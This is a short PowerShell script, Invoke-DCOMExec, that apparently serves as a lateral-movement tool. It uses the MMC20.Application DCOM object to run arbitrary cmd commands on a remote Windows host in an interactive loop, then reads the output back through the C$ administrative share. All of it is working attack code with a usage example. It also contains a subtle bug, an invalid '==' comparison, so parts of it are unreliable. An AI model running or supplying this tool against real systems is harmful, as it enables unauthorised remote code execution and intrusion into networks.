function Invoke-DCOMExec {
<#
    .SYNOPSIS
        Execute's commands via various DCOM MMC20.Application.
    .DESCRIPTION
        Execute's commands via various DCOM MMC20.Application.
    .PARAMETER ComputerName
        IP Address or Hostname of the remote system
    .EXAMPLE
        Import-Module .\Invoke-DCOMExec.ps1
        Invoke-DCOMExec -ComputerName '192.168.2.100'
#>

    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $true, Position = 0, ValueFromPipeLine = $true, ValueFromPipelineByPropertyName = $true)]
        [String]
        $ComputerName

    )
        $Com = [Type]::GetTypeFromProgID("MMC20.Application","$ComputerName")
        $Obj = [System.Activator]::CreateInstance($Com)
        
        
        $Command = ""
        while($Command -ne "exit")
        {
            $Command = Read-Host -Prompt "[DCOMExec]>"
            if ($Command == "exit")
            {
                Exit
            }
            $Obj.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c $Command > C:\Windows\Temp\asdjgqwei.tmp","7")
            cat "\\$ComputerName\c$\Windows\Temp\asdjgqwei.tmp"

        }
}